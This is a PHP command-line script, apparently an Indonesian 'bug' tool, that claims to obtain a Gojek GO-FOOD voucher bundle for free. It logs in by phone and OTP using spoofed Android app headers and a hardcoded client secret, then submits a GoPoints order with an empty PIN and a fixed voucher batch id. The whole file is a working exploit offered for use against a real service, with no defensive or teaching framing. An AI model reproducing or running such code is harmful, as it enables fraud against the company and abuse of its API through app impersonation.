<?php
error_reporting(0);
require 'function.php';

echo "[i] BUG GO-JEK BUY BUNDLE 'Paket langganan GO-FOOD hemat Rp430rb' FREE by DNF.ID\n\n";

// Input pin gopay
echo '[?] Your key? ';
$key = trim(fgets(STDIN));
if ($key == 'sgblondon69') {
    echo '[?] Phone? (62xxx atau 1xxx) ';
    $phone = trim(fgets(STDIN));
    $bearer = "";
    $useruuid = "";
    $uniqueid = rand(1000, 9999).rand(100, 999).'e'.rand(10, 99).'ff'.rand(100, 999).'b';
    $header_login = array(
        'X-AppVersion: 3.22.1',
        'X-UniqueId: '.$uniqueid,
        'X-Platform: Android',
        'X-AppId: com.gojek.app',
        'Accept: application/json',
        'X-Session-ID: 0a6145d4-8c9e-4a26-83d7-b07b3fa29bc2',
        'D1: 31:FC:81:8E:C4:F5:88:0D:92:02:6B:88:30:E0:EE:45:B5:24:E5:D9:FB:94:EE:18:05:36:DB:F1:36:AB:F9:6F',
        'X-PhoneModel: ASUS,ZenFone Max Pro M1',
        'X-PushTokenType: FCM',
        'X-DeviceOS: Android,5.1.1',
        'User-uuid: ',
        'X-DeviceToken: ',
        'Authorization: Bearer',
        'Accept-Language: id-ID',
        'X-User-Locale: id_ID',
        'X-M1: 1:__9b2aedf2760e4cbb8ac111bbbdfc1c18,2:00f0ea90,3:1564269009625-1025403701101507221,4:15998,5:android-x86|2465|2,6:UNKNOWN,7:"Yummy",8:1080x1920,9:passive\,gps,10:1,11:UNKNOWN',
        'Content-Type: application/json; charset=UTF-8',
        'Connection: Keep-Alive',
        'User-Agent: okhttp/3.12.1'
    );
    $deviceId = rand(100, 999).'b6d3c-'.rand(1000, 9999).'-'.rand(1000, 9999).'-9fb7-b1'.rand(10000, 99999).'e4c15';
    $login_with_phone = request('https://api.gojekapi.com/v4/customers/login_with_phone', '{"phone":"+'.$phone.'"}', null, $header_login);
    if (preg_match('/Nomor HP ini tidak valid/', $login_with_phone[1])) {
        $regis = false;
        echo "[i] Response: +62".$phone." [\e[0;0;42mNomor belum terdaftar\e[0m]\n";
    } else if (preg_match('/Kode verifikasi sudah dikirim/', $login_with_phone[1])) {
        $regis = false;
        $otp_token = json_decode($login_with_phone[1])->data->login_token;
        echo "[i] ".json_decode($login_with_phone[1])->data->message."\n[i] Kode OTP? ";
        $otp = trim(fgets(STDIN));
        $verify = request('https://api.gojekapi.com/v4/customers/login/verify', '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp.'","otp_token":"'.$otp_token.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}', null, $header_login);
        if (preg_match('/access_token/', $verify[1])) {
            $bearer = json_decode($verify[1])->data->access_token;
            $uuid = json_decode($verify[1])->data->customer->id;
            echo "[i] Buy Paket langganan GO-FOOD hemat Rp430rb; 20 Voucher GO-FOOD, masing-masing diskon 25rb\n";
            $header_login = array(
                'X-AppVersion: 3.22.1',
                'X-UniqueId: '.$uniqueid,
                'X-Platform: Android',
                'X-AppId: com.gojek.app',
                'Accept: application/json',
                'X-Session-ID: 0a6145d4-8c9e-4a26-83d7-b07b3fa29bc2',
                'D1: 31:FC:81:8E:C4:F5:88:0D:92:02:6B:88:30:E0:EE:45:B5:24:E5:D9:FB:94:EE:18:05:36:DB:F1:36:AB:F9:6F',
                'X-PhoneModel: ASUS,ZenFone Max Pro M1',
                'X-PushTokenType: FCM',
                'X-DeviceOS: Android,5.1.1',
                'User-uuid: '.$uuid,
                'X-DeviceToken: ',
                'Authorization: Bearer '.$bearer,
                'Accept-Language: en-ID',
                'X-User-Locale: en_ID',
                'X-M1: 1:__9b2aedf2760e4cbb8ac111bbbdfc1c18,2:00f0ea90,3:1564269009625-1025403701101507221,4:15998,5:android-x86|2465|2,6:UNKNOWN,7:"Yummy",8:1080x1920,9:passive\,gps,10:1,11:UNKNOWN',
                'Content-Type: application/json; charset=UTF-8',
                'Connection: Keep-Alive',
                'User-Agent: okhttp/3.12.1'
            );
            $order = request('https://api.gojekapi.com/gopoints/v1/orders', '{"gopay_pin":"","payment_type":"points","voucher_batch_id":"ab6000b2-70d5-4f5d-9761-940b49def36d","voucher_count":1}', null, $header_login);
            echo "[i] Response: [\e[0;0;42m".$order[1]."\e[0m]\n";
        } else {
            $regis = false;
            echo "[i] Response: [\e[0;0;41mKode OTP salah\e[0m]\n";
        }
    } else {
        $regis = false;
        echo "[i] Response: [\e[0;0;41mUps, ada yang salah\e[0m]\n";
    }
} else {
    echo "[i] KOE UDU SGBLONDON COK\n";
}
?>